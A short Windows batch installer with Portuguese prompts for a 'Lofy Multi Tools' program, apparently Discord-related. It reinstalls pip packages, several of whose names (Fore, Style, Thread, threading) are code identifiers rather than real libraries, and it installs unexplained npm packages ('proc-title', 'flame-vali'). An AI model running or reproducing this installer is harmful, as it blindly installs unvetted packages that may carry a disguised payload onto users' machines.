@echo off
color A
title Lofy Multi Tools
echo.
echo.
echo.
echo.
echo      Bem vindo ao instalador do Lofy Multi Tools
echo      Voce esta prestes a instalar todos os requisitos
echo      Em caso de duvida entre no grupo do discord.
echo      Este processo pode demorar dependendo de sua maquina
echo.
echo.
echo.
echo.
echo.
echo.
pause nul
cls
color 5
python -m pip install --upgrade pip
cls
pip uninstall -y colorama
pip uninstall -y Fore
pip uninstall -y requests
pip uninstall -y threading
pip uninstall -y discord
pip uninstall -y asyncio
pip uninstall -y Style
pip uninstall -y Thread
pip uninstall -y dhooks
cls
pip install colorama
pip install Fore
pip install requests
pip install threading
pip install discord
pip install asyncio
pip install Style
pip install Thread
pip install dhooks
cls
npm i && npm i proc-title && npm i flame-vali
cls
color 4
echo.
echo.
echo.
echo.
echo      Instalacao concluida pode fechar o instalador.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
pause nul
